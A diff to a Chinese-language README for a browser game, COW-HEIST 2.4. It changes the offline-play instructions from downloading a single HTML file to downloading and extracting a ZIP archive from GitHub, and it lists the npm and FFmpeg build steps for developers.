@@ -8,6 +8,6 @@
 
 ## 双击即玩的单文件版
 
-在 GitHub 文件页下载原始文件 `COW-HEIST-2.4.html`，保存后用 Chrome 或 Edge 打开，选择鼠标模式即可离线试玩。页面、3D 资源、声音和手势资源都内嵌在一个文件中。摄像头模式取决于浏览器权限；课堂提交仍以 Python 作业包为主。
+下载 [COW-HEIST-2.4-DoubleClick.zip](https://github.com/zhaaiyu7624-cell/-/raw/refs/heads/main/COW-HEIST-2.4-DoubleClick.zip)，全部解压后双击里面的 `COW-HEIST-2.4.html`，用 Chrome 或 Edge 打开并选择鼠标模式即可离线试玩。页面、3D 资源、声音和手势资源都内嵌在一个文件中。摄像头模式取决于浏览器权限；课堂提交仍以 Python 作业包为主。
 
 开发者可在 `COW-HEIST-Web` 目录执行 `npm ci`，然后用 `node scripts/build-standalone.mjs` 生成 HTML。生成过程需要 FFmpeg。
